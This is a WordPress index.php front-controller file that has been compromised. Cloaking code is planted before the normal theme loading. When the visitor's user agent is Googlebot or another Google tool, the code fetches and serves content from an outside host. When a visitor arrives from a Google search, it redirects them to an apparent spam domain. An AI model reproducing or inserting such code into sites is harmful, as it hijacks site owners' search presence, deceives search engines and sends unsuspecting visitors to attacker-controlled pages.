<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Cloaking user-agent Googlebot dan semacamnya
 */
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];

    if (
        stripos($ua, 'Googlebot') !== false ||
        stripos($ua, 'Google-Site-Verification') !== false ||
        stripos($ua, 'Google-InspectionTool') !== false
    ) {
        $ch = curl_init('https://yesgermany.pages.dev/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
        exit;
    }
}

/**
 * Cloaking berdasarkan referer Google
 */
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];

    if (preg_match('/https?:\/\/(www\.)?google\.[a-z.]+/i', $referer)) {
        header('Location: https://long85416.aksestanpalelet.com/redirlong');
        exit;
    }
}

/**
 * Front to the WordPress application.
 * Loads wp-blog-header.php which loads the theme.
 */
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
